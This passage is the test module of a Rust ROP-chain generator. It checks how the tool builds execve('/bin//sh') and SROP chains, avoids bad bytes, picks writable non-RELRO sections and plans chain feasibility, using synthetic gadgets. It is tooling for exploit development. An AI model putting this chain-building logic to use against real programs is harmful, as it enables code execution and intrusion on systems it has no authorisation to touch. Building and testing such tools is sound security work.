        assert!(err.to_string().contains("4-byte word"), "{err}");
    }

    /// CHLX-07: SROP. The frame's word offsets are the kernel's, and the
    /// harness reads the SAME table (tests/emulate.py SROP64_SLOTS) — a
    /// one-word disagreement is a chain that restores garbage.
    #[test]
    fn chlx07_srop_frame_layout_matches_the_kernel_struct() {
        let mut g = x64_gadget_set();
        g.push(gadget(0x1100, "pop rax ; ret"));
        let chain =
            build_linux(&g, &data(), Arch::X64, "elf", &[], &opts(LinuxTarget::Srop)).unwrap();
        // rt_sigreturn's number is popped, the trap follows, then the frame.
        let trap = chain
            .words
            .iter()
            .position(|w| w.comment.starts_with("syscall"))
            .expect("the syscall gadget");
        let frame = &chain.words[trap + 1..];
        assert_eq!(frame.len(), SROP64_WORDS, "the frame is a fixed 31 words");
        assert_eq!(frame[SROP64_RAX].value, 59, "rax = __NR_execve");
        assert_eq!(frame[SROP64_RDI].value, 0x6bc080, "rdi = the path");
        assert_eq!(frame[SROP64_RSI].value, 0, "rsi = NULL");
        assert_eq!(frame[SROP64_RDX].value, 0, "rdx = NULL");
        assert_eq!(frame[SROP64_CSGSFS].value, 0x33, "cs = 0x33");
        assert_eq!(frame[SROP64_RIP].value, 0x1080, "rip = the syscall gadget");
        assert!(
            chain.words.iter().any(|w| w.value == 15),
            "rt_sigreturn's number"
        );

        // i386's sigcontext is a different structure and is not modelled.
        let err = build_linux(
            &x86_gadget_set(),
            &data(),
            Arch::X86,
            "elf",
            &[],
            &opts(LinuxTarget::Srop),
        )
        .unwrap_err();
        assert!(err.to_string().contains("x86-64 only"), "{err}");
    }

    /// ECO-04: `plan_linux` never fails, names the requirement that is
    /// missing, and counts the candidates each strategy had.
    #[test]
    fn eco04_plan_linux_reports_the_missing_requirement() {
        // No `pop rdx`, no `xor rdx, rdx`, no transfer into rdx.
        let g = vec![
            gadget(0x1000, "mov qword ptr [rdi], rsi ; ret"),
            gadget(0x1010, "pop rdi ; ret"),
            gadget(0x1020, "pop rsi ; ret"),
            gadget(0x1030, "pop rax ; ret"),
            gadget(0x1040, "syscall"),
        ];
        let plan = plan_linux(
            &g,
            &data(),
            Arch::X64,
            "elf",
            &[],
            &LinuxChainOpts::default(),
        );
        assert!(!plan.feasible);
        assert!(plan.error.is_some());
        let rdx = plan
            .requirement("set_rdx")
            .expect("set_rdx is a requirement");
        assert!(!rdx.satisfied);
        assert!(!rdx.strategies_tried.is_empty());
        assert!(rdx.strategies_tried.iter().all(|s| s.candidates == 0));
        // ...and the ones it DOES have are reported as satisfied, with the
        // gadget that satisfies them.
        assert!(plan.requirement("set_rdi").unwrap().satisfied);
        let sat = plan
            .satisfied_requirements
            .iter()
            .find(|s| s.id == "set_rdi")
            .expect("set_rdi is satisfied");
        assert_eq!(sat.vaddr, 0x1010);
        assert_eq!(sat.text, "pop rdi ; ret");
        assert!(plan.requirement("write_primitive").unwrap().satisfied);
        assert!(plan.requirement("syscall_trap").unwrap().satisfied);

        // The same binary CAN host a chain once rdx is reachable, and the
        // plan then says so — feasibility is the real builder's verdict.
        let mut ok = g.clone();
        ok.push(gadget(0x1050, "pop rdx ; ret"));
        let plan = plan_linux(
            &ok,
            &data(),
            Arch::X64,
            "elf",
            &[],
            &LinuxChainOpts::default(),
        );
        assert!(plan.feasible, "{:?}", plan.error);
        assert!(plan.word_count.unwrap() > 0);
        assert!(plan.requirements.iter().all(|r| r.satisfied));
    }

    /// ECO-04: a relaxation is only recorded against an UNSATISFIED
    /// requirement, and `would_help` is whatever the variant measured.
    #[test]
    fn eco04_relaxations_are_merged_from_a_measured_variant() {
        let poor = vec![
            gadget(0x1000, "mov qword ptr [rdi], rsi ; ret"),
            gadget(0x1010, "pop rdi ; ret"),
            gadget(0x1020, "pop rsi ; ret"),
            gadget(0x1030, "pop rax ; ret"),
            gadget(0x1040, "syscall"),
        ];
        let mut rich = poor.clone();
        rich.push(gadget(0x1050, "pop rdx ; ret"));
        let mut base = plan_linux(
            &poor,
            &data(),
            Arch::X64,
            "elf",
            &[],
            &LinuxChainOpts::default(),
        );
        let variant = plan_linux(
            &rich,
            &data(),
            Arch::X64,
            "elf",
            &[],
            &LinuxChainOpts::default(),
        );
        base.merge_relaxation(&variant, "depth", "10", "20");
        let rdx = base.requirement("set_rdx").unwrap();
        assert_eq!(rdx.relaxations.len(), 1);
        assert!(
            rdx.relaxations[0].would_help,
            "the variant satisfies set_rdx"
        );
        assert_eq!(rdx.relaxations[0].param, "depth");
        // A satisfied requirement gets no relaxation entry at all.
        assert!(base.requirement("set_rdi").unwrap().relaxations.is_empty());
    }

    /// ECO-04: an unsupported target is a RESULT, not an error.
    #[test]
    fn eco04_plan_linux_never_fails_on_an_unsupported_target() {
        let plan = plan_linux(
            &x64_gadget_set(),
            &data(),
            Arch::Arm64,
            "elf",
            &[],
            &LinuxChainOpts::default(),
        );
        assert!(!plan.feasible);
        assert_eq!(plan.arch, "arm64");
        assert!(!plan.requirements.is_empty());
        assert!(plan.error.unwrap().contains("not supported yet"));
    }

    #[test]
    fn missing_gadgets_are_structured_errors() {
        let g = vec![gadget(0x1000, "pop rdi ; ret")];
        let err = build_linux_execve(&g, &data(), Arch::X64, "elf", &[]).unwrap_err();
        assert!(matches!(err, ChainError::MissingGadget(_)));
        assert!(err.to_string().contains("mov qword ptr [r64], r64"));

        // no writable section at all
        let err = build_linux_execve(&x64_gadget_set(), &[], Arch::X64, "elf", &[]).unwrap_err();
        assert!(matches!(err, ChainError::NoWritableSection));

        // unsupported arch/format (ropmaker.py:23-40 dispatch)
        let err =
            build_linux_execve(&x64_gadget_set(), &data(), Arch::Arm64, "elf", &[]).unwrap_err();
        assert!(matches!(err, ChainError::Unsupported { .. }));
        let err = build_linux_execve(&x64_gadget_set(), &data(), Arch::X64, "pe", &[]).unwrap_err();
        assert!(matches!(err, ChainError::Unsupported { .. }));
    }

    /// CHLX-03: `--badbytes` used to be an unrecoverable hard failure. The
    /// write address now slides inside its section until the packed words
    /// are clean.
    #[test]
    fn chlx03_badbyte_in_data_addr_slides_the_write() {
        let g = x86_gadget_set();
        // elf-Linux-x86's real layout: .data at 0x080f4060, .bss right after.
        let sections = vec![
            DataSection {
                name: ".data".into(),
                vaddr: 0x080f4060,
                writable: true,
            },
            DataSection {
                name: ".bss".into(),
                vaddr: 0x080f4c80,
                writable: true,
            },
        ];
        // 0x60 is the low byte of the .data base: the old builder aborted.
        let chain = build_linux_execve(&g, &sections, Arch::X86, "elf", &[0x60]).unwrap();
        let first_data = chain
            .words
            .iter()
            .find(|w| w.kind == WordKind::DataAddr)
            .unwrap();
        assert_ne!(first_data.value, 0x080f4060);
        assert_eq!(first_data.value & !0xfff, 0x080f4000);
        for w in &chain.words {
            if w.kind != WordKind::GadgetAddr {
                assert!(
                    !w.value.to_le_bytes()[..4].contains(&0x60),
                    "word {:#x} still carries the bad byte",
                    w.value
                );
            }
        }
    }

    /// CHLX-03: the padding constant is a choice, not a constant of nature.
    #[test]
    fn chlx03_padding_constant_avoids_bad_bytes() {
        let mut g = x64_gadget_set();
        // force a padding word: the rdx gadget pops a second register
        g.retain(|x| x.text() != "pop rdx ; ret");
        g.push(gadget(0x1700, "pop rdx ; pop rbx ; ret"));
        let chain = build_linux_execve(&g, &data(), Arch::X64, "elf", &[0x41]).unwrap();
        let pads: Vec<u64> = chain
            .words
            .iter()
            .filter(|w| w.kind == WordKind::Padding && w.comment == "padding")
            .map(|w| w.value)
            .collect();
        assert!(!pads.is_empty(), "the chain does contain padding");
        assert!(pads.iter().all(|v| !v.to_le_bytes().contains(&0x41)));
    }

    /// CHLX-03: when no address in any window can avoid the bad bytes the
    /// error is still structured — the search does not loop or panic.
    #[test]
    fn chlx03_impossible_badbytes_still_report_cleanly() {
        let g = x64_gadget_set();
        let err = build_linux_execve(&g, &data(), Arch::X64, "elf", &[0x00]).unwrap_err();
        assert!(matches!(
            err,
            ChainError::InvalidWord { .. } | ChainError::MissingGadget(_)
        ));
    }

    /// CHLX-05: `.tdata` is a TLS template offset and `.init_array` is
    /// read-only after RELRO. Neither is a place to write "/bin//sh".
    #[test]
    fn chlx05_tls_and_relro_sections_are_not_write_targets() {
        let sections = vec![
            DataSection {
                name: ".tdata".into(),
                vaddr: 0x6bbea0,
                writable: true,
            },
            DataSection {
                name: ".init_array".into(),
                vaddr: 0x6bbec0,
                writable: true,
            },
            DataSection {
                name: ".got".into(),
                vaddr: 0x6bbff0,
                writable: true,
            },
            DataSection {
                name: ".got.plt".into(),
                vaddr: 0x6bc000,
                writable: true,
            },
        ];
        let windows = usable_write_windows(&sections);
        assert_eq!(
            windows.iter().map(|w| w.name.as_str()).collect::<Vec<_>>(),
            vec![".got.plt"],
        );
        let chain =
            build_linux_execve(&x64_gadget_set(), &sections, Arch::X64, "elf", &[]).unwrap();
        assert_eq!(chain.words[1].value, 0x6bc000, "wrote into .got.plt");
    }

    /// CHLX-05, on the project's own fixtures. The section tables here are
    /// the real ones, read out of `tests/fixtures/*` with the ELF section
    /// headers; the point of the test is which section each RULE picks once
    /// `.data` is not in the list (a stripped or custom-linked binary).
    ///
    /// Old rule — `.data` by name, else the FIRST writable non-executable
    /// section — lands on `.tdata` for elf-Linux-x64 (a TLS template offset,
    /// covered by `PT_GNU_RELRO` 0x6bbea0..0x6bc020) and on `.init_array`
    /// for Linux_lib64.so (read-only after RELRO, and eight bytes long
    /// against a sixteen-byte write).
    #[test]
    fn chlx05_project_fixture_sections() {
        // elf-Linux-x64, non-executable allocated sections in header order.
        let x64 = [
            (".tdata", 0x6bbea0u64),
            (".tbss", 0x6bbec0),
            (".init_array", 0x6bbec0),
            (".fini_array", 0x6bbed0),
            (".jcr", 0x6bbee0),
            (".data.rel.ro", 0x6bbf00),
            (".got", 0x6bbff0),
            (".got.plt", 0x6bc000),
            (".bss", 0x6bd680),
            ("__libc_freeres_ptrs", 0x6bfec8),
        ];
        // Linux_lib64.so, same.
        let lib64 = [
            (".init_array", 0x3135e0u64),
            (".fini_array", 0x3135e8),
            (".jcr", 0x3135f0),
            (".data.rel.ro", 0x313600),
            (".dynamic", 0x315c70),
            (".got", 0x315f60),
            (".got.plt", 0x316000),
            (".bss", 0x317500),
        ];
        for (label, table, old_pick, new_pick) in [
            ("elf-Linux-x64", &x64[..], ".tdata", ".bss"),
            ("Linux_lib64.so", &lib64[..], ".init_array", ".bss"),
        ] {
            let sections: Vec<DataSection> = table
                .iter()
                .map(|(name, vaddr)| DataSection {
                    name: (*name).to_string(),
                    vaddr: *vaddr,
                    writable: true,
                })
                .collect();
            // what the pre-v0.5 fallback took
            assert_eq!(
                sections.iter().find(|s| s.writable).unwrap().name,
                old_pick,
                "{label}: old rule"
            );
            let windows = usable_write_windows(&sections);
            assert_eq!(windows[0].name, new_pick, "{label}: new rule");
            for w in &windows {
                assert!(!section_is_tls(&w.name) && !section_is_relro(&w.name));
            }
        }
    }

    /// CHLX-05: a section literally named `.data` is only a target when it
    /// is actually writable.
    #[test]
    fn chlx05_non_writable_data_is_rejected() {
        let sections = vec![
            DataSection {
                name: ".data".into(),
                vaddr: 0x600000,
                writable: false,
            },
            DataSection {
                name: ".bss".into(),
                vaddr: 0x601000,
                writable: true,
            },
        ];
        let windows = usable_write_windows(&sections);
        assert_eq!(windows.len(), 1);
        assert_eq!(windows[0].name, ".bss");
    }

    /// CHLX-05: with nothing writable, non-TLS and post-RELRO left, the
    /// builder refuses rather than writing somewhere it cannot.
    #[test]
    fn chlx05_no_usable_section_is_an_error() {
        let sections = vec![
            DataSection {
                name: ".tbss".into(),
                vaddr: 0x1000,
                writable: true,
            },
            DataSection {
                name: ".fini_array".into(),
                vaddr: 0x2000,
                writable: true,
            },
            DataSection {
                name: ".rodata".into(),
                vaddr: 0x3000,
                writable: false,
            },
        ];
        assert!(usable_write_windows(&sections).is_empty());
        let err =
            build_linux_execve(&x64_gadget_set(), &sections, Arch::X64, "elf", &[]).unwrap_err();
        assert!(matches!(err, ChainError::NoWritableSection));
    }

    /// The write window stops at the next section, so the alternative-address
    /// search can never slide out of the section it started in.
    #[test]
    fn chlx05_write_window_ends_at_the_next_section() {
        let windows = usable_write_windows(&data());
        let d = windows.iter().find(|w| w.name == ".data").unwrap();
        assert_eq!(d.base, 0x6bc080);
        assert_eq!(d.end, 0x6bd680, "bounded by .bss");
        let last = windows.iter().find(|w| w.name == ".bss").unwrap();
        assert_eq!(last.base, last.end, "the last section gets no slide room");
    }

    #[test]
    fn data_fallback_to_writable_section() {
        let g = x64_gadget_set();
        let sections = vec![DataSection {
            name: ".got.plt".into(),
            vaddr: 0x600000,
            writable: true,
        }];
        let chain = build_linux_execve(&g, &sections, Arch::X64, "elf", &[]).unwrap();
        assert_eq!(chain.words[1].value, 0x600000, "fell back to .got.plt");
    }

    /// Emulator finding on elf-Linux-x86: `mov dword ptr gs:[eax], edx` is
    /// reported as a write through eax but lands at `gs_base + eax`, and
    /// `push ecx ; pop es ; pop ebx ; ret` faults at the segment pop even
    /// though its stack accounting is exact. Neither may enter a chain.
    #[test]
    fn segment_and_push_gadgets_are_never_modelled() {
        for text in [
            "mov qword ptr gs:[rdi], rsi ; ret",
            "push rcx ; pop rdi ; ret",
            "pop es ; ret",
            "mov qword ptr [rdi], rsi ; leave ; ret",
        ] {
            assert!(
                model_from_text(&gadget(0x1, text), 8).is_none(),
                "{text} must not be modelled"
            );
        }
        // and the whole-chain consequence: the segment store is not a
        // write-what-where primitive, so the build falls back or refuses.
        let mut g = x64_gadget_set();
        g.retain(|x| x.text() != "mov qword ptr [rdi], rsi ; ret");
        g.push(gadget(0x1800, "mov qword ptr gs:[rdi], rsi ; ret"));
        assert!(build_linux_execve(&g, &data(), Arch::X64, "elf", &[]).is_err());
    }

    /// CHLX-03: an alternative padding constant must still fit the chain's
    /// word. A 64-bit `0x4242424242424242` on x86 renders fine but corrupts
    /// the JSON IR — the emulator harness reads that, and it raised
    /// `OverflowError: int too big to convert`.
    #[test]
    fn chlx03_alternative_padding_fits_the_word_size() {
        let mut g = x86_gadget_set();
        g.push(gadget(0x1810, "pop ecx ; pop esi ; ret"));
        let sections = vec![
            DataSection {
                name: ".data".into(),
                vaddr: 0x08070000,
                writable: true,
            },
            DataSection {
                name: ".bss".into(),
                vaddr: 0x08071000,
                writable: true,
            },
        ];
        let chain = build_linux_execve(&g, &sections, Arch::X86, "elf", &[0x41]).unwrap();
        assert_eq!(chain.word_size, 4);
        for w in &chain.words {
            assert!(
                w.value <= u32::MAX as u64,
                "word {:#x} does not fit a 4-byte chain word",
                w.value
            );
        }
    }

    /// CHLX-08: the chain-side half of the PIE warning. The CLI renders it;
    /// this decides whether there is anything to render.
    #[test]
    fn chlx08_pie_warning_signal() {
        assert!(pie_chain_warning(false, 0x400000, 0).is_none());
        assert!(pie_chain_warning(true, 0, 0x7ffff7a00000).is_none());
        let w = pie_chain_warning(true, 0, 0).unwrap();
        assert!(w.contains("ET_DYN"));
        assert!(w.contains("--offset"));
    }
}
